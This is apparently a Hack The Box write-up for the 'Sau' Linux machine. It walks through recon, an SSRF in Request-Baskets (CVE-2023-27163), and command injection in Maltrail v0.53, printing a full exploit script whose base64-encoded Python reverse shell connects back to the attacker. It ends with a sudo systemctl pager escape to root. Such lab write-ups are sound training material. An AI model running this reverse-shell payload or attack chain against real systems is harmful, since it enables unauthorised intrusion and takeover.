---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Request-Baskets
  - CVE-2023-27163
  - SSRF
  - Maltrail
  - Command-Injection
---
# Overview

| Name        | Sau       |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.229.26 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 01:05 CDT
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 01:07 (0:00:59 remaining)
Nmap scan report for 10.129.229.26
Host is up (0.079s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 17 Oct 2025 06:06:15 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 17 Oct 2025 06:05:48 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 17 Oct 2025 06:05:49 GMT
|_    Content-Length: 0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 wasn't giving anything just error of not showing and nothing interesting findings even after fuzzing.

![[sau.png]]

Port `55555` has `request-baskets | Version: 1.2.1` running.
# Initial Foothold
## [CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163) SSRF

```bash
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
```

```bash
$ ./CVE-2023-27163.sh http://sau.htb:55555/ http://127.0.0.1:80/
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "qwmovr" proxy basket...
> Basket created!
> Accessing http://sau.htb:55555/qwmovr now makes the server request to http://127.0.0.1:80/.
> Authorization: dKDzYMxgfU8lZ9TzyQl1LjAMYrk6sKWE_rDE1a373J-I
```

Now we can go to `http://sau.htb:55555/qwmovr` which will show us locally run content of port 80.

![[sau2.png]]

`Maltrail (v0.53)` seems to be vulnerable to command injection.
## [Maltrail (v0.53)](https://github.com/spookier/Maltrail-v0.53-Exploit)

```bash
$ git clone https://github.com/spookier/Maltrail-v0.53-Exploit
Cloning into 'Maltrail-v0.53-Exploit'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 17 (delta 4), reused 9 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (17/17), 4.44 KiB | 4.44 MiB/s, done.
Resolving deltas: 100% (4/4), done.
$ cd Maltrail-v0.53-Exploit/
```

Modify `exploit.py`:

```python
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

Change:

```python
target_URL = sys.argv[3] + "/login"
```

to:

```python
target_URL = sys.argv[3] + "/qwmovr/login"
```

```python
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/qwmovr/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

```bash
$ python3 exploit.py 10.10.14.122 4444 10.129.229.26:55555
Running exploit on 10.129.229.26:55555/qwmovr/login
```

```bash
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.229.26] 56608
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
puma@sau:/opt/maltrail$ cd /home
cd /home
puma@sau:/home$ ls
ls
puma
puma@sau:/home$ cd puma
cd puma
puma@sau:~$ ls
ls
user.txt
puma@sau:~$ cat user.txt
cat user.txt
df5366d0ead03e20a0d5111c19c30533
```
# Privilege Escalation

```bash
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

```bash
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Fri 2025-10-17 06:03:56 UTC; 17min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 858 (python3)
      Tasks: 12 (limit: 4662)
     Memory: 27.7M
     CGroup: /system.slice/trail.service
             ├─ 858 /usr/bin/python3 server.py
             ├─1035 /bin/sh -c logger -p auth.info -t "maltrail[858]" "Failed p>
             ├─1037 /bin/sh -c logger -p auth.info -t "maltrail[858]" "Failed p>
             ├─1041 sh
             ├─1046 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1047 /bin/sh
             ├─1048 python3 -c import pty; pty.spawn("/bin/bash")
             ├─1049 /bin/bash
             ├─1062 sudo /usr/bin/systemctl status trail.service
             ├─1064 /usr/bin/systemctl status trail.service
             └─1065 pager

Oct 17 06:03:56 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
Oct 17 06:20:26 sau sudo[1061]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=ro>
```

Enter `!/bin/sh` in terminal to launch the shell.

```bash
lines 1-23!/bin/sh
!//bbiinn//sshh!/bin/sh
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
5534d2821ded4c5e790eee739ef0a3bf
```

---
